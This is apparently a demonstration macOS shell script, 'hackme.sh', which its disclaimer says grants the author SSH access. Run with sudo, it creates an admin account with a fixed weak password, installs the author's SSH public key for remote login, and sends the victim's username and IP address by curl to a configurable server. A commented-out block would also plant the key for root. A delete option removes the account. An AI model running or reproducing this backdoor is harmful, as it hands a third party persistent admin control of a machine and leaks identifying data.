# DISCLAIMER
#
# This file will create a user account in your system (Mac OS), add it to
# the admin group so he can perform admin tasks, and grant SSH access to me.
# The only purpose of this file is to demonstrate a tool usage and it is not
# intended to harm you or your system in any way. But hey, install it only
# at your own risk!

username=lab
pwd=4242
host_ip=127.0.0.1
if [ -z $1 ]
then
	echo "\033[92m -------------------- Usage: ---------------------\033[0m"
	echo "   sudo ./hackme.sh [args]\n"
	echo "\033[92m ------------- To launch the script --------------\033[0m"
	echo "   sudo ./hackme.sh launch\n"
	echo "\033[92m ------- To undo changes clean everything --------\033[0m"
	echo "   sudo ./hackme.sh delete\n"
fi
if [ "$1" = "launch" ]
then
	id=4242
	key="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGa7ecdJUqZ+x1YBTqo2yAoue7KLFs73QL2oM5hAQHbxLs5PomYX9KJ5+fHbfoGXSd6K+j64aai/cO1/jnBHaJdITEB+9hYNeCEag9AylBKKMdIYEqBkcB9PaUeJZNOj5AmaNC3N3zNIphz/mOdgG3TLPVdl+jaV6iJGVZVg6jN/c/l9VzAzybSVl3Aq1WrZnsppgSOXVtq4t8XgewgNiElAWzeQXE4OhpJYy0IW3uMY9bJNOetTdYrJxFtuvAna18VnORuMJs0/t/YgnlpRyN3fjwTObkhQfxdaYxbiFm2k9/FdTnERxmSAyxaWIsypBJtG/IF0pg7vDbfeZwHShH esk@esk"
	dscl . -create /Users/$username
	dscl . -create /Users/$username UserShell /bin/bash
	dscl . -create /Users/$username RealName "Ansible $username"
	dscl . -create /Users/$username UniqueID $id
	dscl . -create /Users/$username PrimaryGroupID 1000
	dscl . -create /Users/$username NFSHomeDirectory /Local/Users/$username
	dscl . -passwd /Users/$username $pwd
	dscl . -append /Groups/admin GroupMembership $username

	# Grant SSH acces via USER method
	mkdir -p /Local/Users/$username
	mkdir /Local/Users/$username/.ssh
	touch /Local/Users/$username/.ssh/authorized_keys
	echo $key > /Local/Users/$username/.ssh/authorized_keys

	# Copy some files for the demonstration
	cp src/laugh.wav /Local/Users/$username/laugh.wav

	# Make a request so my server knows you were "hacked"
	runner_user=`who | grep -m1 "" | cut -d " " -f1`
	runner_ip=`ifconfig  | grep inet | grep broadcast | cut -d " " -f2`
	url="http://$host_ip:5000?user=$runner_user=&ip=$runner_ip"
	curl $url
	# curl

	# Grant SSH acces via ROOT [DANGER DANGER DANGER]
	# if [ -f /var/root/.ssh/authorized_keys ]
	# then
	# 	cp /var/root/.ssh/authorized_keys /var/root/.ssh/authorized_keys.old
	# fi
	# mkdir -p /var/root/.ssh
	# touch -f /var/root/.ssh/authorized_keys
	# echo $key > /var/root/.ssh/authorized_keys
elif [ "$1" = "delete" ]
then
	# Delete the created user and files
	dscl . delete /Users/$username
	rm -rf /Local/Users/$username
fi
